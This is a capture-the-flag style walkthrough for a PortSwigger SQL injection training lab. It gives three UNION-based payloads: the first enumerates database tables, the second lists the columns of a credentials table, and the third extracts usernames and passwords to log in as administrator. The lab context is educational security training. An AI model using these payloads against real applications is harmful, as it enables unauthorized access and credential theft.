# Lab: SQL injection attack, listing the database contents on non-Oracle databases (Practitioner)

**PortSwigger:** [Official lab](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)

**Description:** Identify the credentials table on a non-Oracle database and use the administrator account to log in.

**Goal:** Retrieve the administrator password by listing tables and columns.

## Solution Steps

1. List tables:

```
' UNION SELECT table_name, NULL FROM information_schema.tables--
```

Look for a table like `users_phmarb`.

2. List columns of that table:

```
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_phmarb'--
```

3. Retrieve data:

```
' UNION SELECT username_kirwfo, password_jvusjm FROM users_phmarb--
```

4. Log in as administrator with the found password.


